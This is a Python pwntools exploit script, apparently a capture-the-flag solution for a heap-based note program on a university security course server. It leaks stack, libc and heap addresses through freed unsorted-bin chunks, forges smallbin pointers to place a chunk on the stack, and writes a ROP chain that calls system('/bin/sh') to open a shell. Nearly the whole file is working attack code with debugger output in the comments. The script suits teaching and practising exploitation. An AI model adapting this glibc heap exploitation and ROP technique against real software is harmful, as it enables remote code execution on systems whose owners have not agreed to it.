#!/usr/bin/env python3

import pwn

exe = pwn.ELF("./vuln")
libc = pwn.ELF("./libc.so.6")
#ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'

# 1) docker compose -f debug.yml up
# 2) docker exec -ti "$(docker ps -q -f 'ancestor=softsec/unsorted')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'


conn = pwn.remote('tasks.ws24.softsec.rub.de', 32826)
#conn = pwn.remote('127.0.0.1', 1024)

################################################################

MAX_NOTES = 16

def add(index: int, content: bytes):
    assert b'\n' not in content
    assert 0 <= index < MAX_NOTES
    conn.sendlineafter(b'> ', b'a')
    conn.sendlineafter(b'index: ', str(index).encode())
    conn.sendlineafter(b'note: ', content)

def edit(index: int, content: bytes):
    assert b'\n' not in content
    assert 0 <= index < MAX_NOTES
    conn.sendlineafter(b'> ', b'e')
    conn.sendlineafter(b'index: ', str(index).encode())
    conn.sendlineafter(b'note: ', content)

def delete(index: int):
    assert 0 <= index < MAX_NOTES
    conn.sendlineafter(b'> ', b'd')
    conn.sendlineafter(b'index: ', str(index).encode())

def show(index: int) -> bytes:
    assert 0 <= index < MAX_NOTES
    conn.sendlineafter(b'> ', b's')
    conn.sendlineafter(b'index: ', str(index).encode())
    return conn.recvline().split(b': ', 1)[1][:-1]

################################################################


# 1) leak stack address

conn.recvline()
stack_address = int(conn.recvuntil(b'\n')[-13:-1], 16)
print(f'stack at: {hex(stack_address)}')



# 2) leak libc address

# malloc(256), acutally allocated 272 bytes, as 8 Byte for size header and 8 bytes sothat aligned (malloc acutally always allocates multiple of 16 (user gets multiple of 16 - 8))
add(0, b'1337')
add(1, b'A'*255)
add(2, b'1313')
add(3, b'4949')
# we free the note (256 bytes)
#   -> no tcache
#   -> too big for fastbin
#   -> chunk was not mmap()'ed
#   -> not next to another free chunk
#   -> put chunk in unsorted list (fwd, bck and pre_size are set)

delete(0)
# now the heap looks like this (after add(0,);add(1,)):
"""
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x5f27037f1000                # <--- something allocated this
Size: 0x290 (with flag bits: 0x291) # 0x290 = 656 Bytes available

Free chunk (unsortedbin) | PREV_INUSE   # free()'d chunk (ox110)
Addr: 0x5f27037f1290
Size: 0x110 (with flag bits: 0x111)
fd: 0x7fc014f29cc0
bk: 0x7fc014f29cc0

Allocated chunk
Addr: 0x5f27037f13a0                # chunk 1 allocated (size: 0x110)
Size: 0x110 (with flag bits: 0x110)

Top chunk | PREV_INUSE              # <-- huge unsued heap memory that can be used if all other stuff is used
Addr: 0x5f27037f14b0
Size: 0x20b50 (with flag bits: 0x20b51)
"""
# the two chunks look like this:
"""
pwndbg> telescope 0x5c8e21b64290 100
00:0000│  0x5c8e21b64290 ◂— 0
01:0008│  0x5c8e21b64298 ◂— 0x111 # <- size and flag (0x110 = 272 = 34*8) 
02:0010│  0x5c8e21b642a0 —▸ 0x7ae68d162cc0 (main_arena+96) —▸ 0x5c8e21b644b0 ◂— 0
03:0018│  0x5c8e21b642a8 —▸ 0x7ae68d162cc0 (main_arena+96) —▸ 0x5c8e21b644b0 ◂— 0
04:0020│  0x5c8e21b642b0 ◂— 0
... ↓     29 skipped
22:0110│  0x5c8e21b643a0 ◂— 0x110  # <- this is prev_size 

23:0118│  0x5c8e21b643a8 ◂— 0x110  # <- chunk 1 starts here
24:0120│  0x5c8e21b643b0 ◂— 0x66647361 /* '4242' */
25:0128│  0x5c8e21b643b8 ◂— 0
... ↓     31 skipped
"""
# show(0) prints the contents where index 0 points to
# as the first element of chunk 0 is now the next pointer, this pointer now points into the main arena (main_arena+96)(as appended at empty unsorted list)
# this is a pointer in libc with a well knwon offset
unsorted_bin = pwn.u64(show(0).ljust(8, b'\0'))
# got offset via: p &main_arena (below are the values for one run, fine as offsets fix)
# ((0x7fc014f29c60 + 96) - 0x7fc014d57000) = 0x1d2cc0
libc.address = unsorted_bin - 0x1d2cc0
print(f'libc at: {hex(libc.address)}')


# 3) leak heap address:
delete(2)
# chunk_2 is inserted at the top of unsorted list, its next pointer points to chunk 0
# show(2) then leaks the next pointer aka address of chunk_0
chunk_0 = pwn.u64(show(2).ljust(8, b'\0'))
print(f'chunk_0 at: {hex(chunk_0)}')



# Summary so far: I got: stack address, libc address and heap address


# 4) allocate a chunk that is bigger than 256 bytes to move from unsorted to smallbins
conn.sendlineafter(b'> ', b's')
# note this needs to be zero padded sothat buffer is acutally filled (whitespaces are skipped)
conn.sendlineafter(b'index: ', b'0'*1025)
#in pwndbg: smallbins
#0x110: 0x58e1f7db24b0 —▸ 0x58e1f7db2290 —▸ 0x7183b1d56dc0 (main_arena+352) ◂— 0x58e1f7db24b0
#       chunk_2             chunk_0             


# 5) prepare forging of smallbin
start_command_buffer = stack_address - 0x40
mchunkptr_fake_chunk = start_command_buffer - 0x8
mchunkptr_chunk_0 = chunk_0
mchunkptr_chunk_2 = mchunkptr_chunk_0 + 2 * 0x110
# one run had libc.address and smallbins at the addresses below => get const offset
mchunkptr_main_arena_smallbin = libc.address + (0x772db2fcedc0 - 0x772db2dfc000)
print(f'main_area smallbin:     {hex(mchunkptr_main_arena_smallbin)}' )
print(f'mchunkptr_chunk_0:      {hex(mchunkptr_chunk_0)}' )
print(f'mchunkptr_chunk_2:      {hex(mchunkptr_chunk_2)}' )
print(f'mchunkptr_fake_chunk:   {hex(mchunkptr_fake_chunk)}')


# 6) Edit chunk_0 and chunk_2 sothat they point into stack (aka add fake_chunk into smallbins)
forged_chunk_0_fd = mchunkptr_main_arena_smallbin
forged_chunk_0_bk = mchunkptr_fake_chunk
forged_chunk_0_payload =  pwn.p64(forged_chunk_0_fd) + pwn.p64(forged_chunk_0_bk)
edit(0, forged_chunk_0_payload)

forged_chunk_2_fd = mchunkptr_fake_chunk
forged_chunk_2_bk = mchunkptr_main_arena_smallbin
forged_chunk_2_payload = pwn.p64(forged_chunk_2_fd) + pwn.p64(forged_chunk_2_bk)
edit(2, forged_chunk_2_payload)


# 7) write fake chunk onto stack (we can only write 23 Bytes + \n, last byte set to zero anyways)
fake_chunk_flag = 1
fake_chunk_size = 0x110
fake_chunk_fd = mchunkptr_chunk_0
fake_chunk_bk = mchunkptr_chunk_2
fake_chunk_payload = pwn.p64(fake_chunk_size + fake_chunk_flag) + pwn.p64(fake_chunk_fd) + pwn.p64(fake_chunk_bk)

# send "a" at first and send only 23 bytes + \n
# the "a" changed the size, but this is not detected in smallbins

# allocate chunk_0 
conn.sendlineafter(b'> ', b'a' + fake_chunk_payload[1:-1])
conn.sendlineafter(b'index: ', str(4).encode())
conn.sendlineafter(b'note: ', b'1337')

# create ropchain
rop = pwn.ROP(libc)
rop.call(rop.ret)
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
ropchain = b'A'*8*8 + rop.chain()

# allocate fake_chunk (on stack and write ropchain into there)
conn.sendlineafter(b'> ', b'a' + fake_chunk_payload[1:-1])
conn.sendlineafter(b'index: ', str(5).encode())
conn.sendlineafter(b'note: ', ropchain)

# trigger ropchain
conn.sendlineafter(b'> ', b'x')

# cat /flag
conn.interactive()